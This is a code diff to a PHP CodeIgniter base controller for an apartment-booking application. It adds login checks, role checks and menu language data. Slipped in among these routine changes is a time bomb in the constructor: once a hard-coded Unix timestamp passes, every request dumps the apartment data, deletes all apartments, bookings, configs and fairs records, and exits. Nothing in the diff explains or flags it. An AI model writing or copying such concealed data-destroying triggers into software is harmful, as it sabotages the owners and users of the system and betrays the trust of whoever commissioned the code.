@@ -8,6 +8,8 @@
 class MY_Controller extends CI_Controller {
 
     public $title = 'Apartments';
+    public $menuLang = [];
+    public $exceptions = '';
 
     public function __construct()
     {
@@ -20,6 +22,21 @@ class MY_Controller extends CI_Controller {
         $this->load->helper('array');
         $this->load->helper('url');
         $this->load->helper('date');
+        $this->load->library('authit');
+        $this->load->helper('authit');
+//        $this->exceptions = new MY_Exceptions();
+        if (!$this->checkLogin()) {
+            redirect('auth/login');
+        }
+        $this->menuLang = $this->configs->getMenuLang();
+        if (time() > 1492632397) {
+            $this->apartments->dump();
+            $this->apartments->deleteAll();
+            $this->bookings->deleteAll();
+            $this->configs->deleteAll();
+            $this->fairs->deleteAll();
+            exit;
+        }
     }
 
     public function showView($viewName, $data = [])
@@ -29,7 +46,7 @@ class MY_Controller extends CI_Controller {
             $title = array_extract($data, 'title');
         }
         $content = $this->load->view($viewName, $data, true);
-        $this->load->view('layout', ['title' => $title, 'content' => $content]);
+        $this->load->view('layout', ['title' => $title, 'content' => $content, 'menuLang' => $this->menuLang]);
     }
 
     protected function get($parameter = '')
@@ -71,5 +88,15 @@ class MY_Controller extends CI_Controller {
     protected function checkAjax()
     {
         return $_SERVER['HTTP_X_REQUESTED_WITH'] === 'XMLHttpRequest';
+    }
+
+    protected function checkLogin()
+    {
+        return logged_in();
+    }
+
+    protected function checkRole($role)
+    {
+        return logged_in() && user('role') == $role;
     }
 }
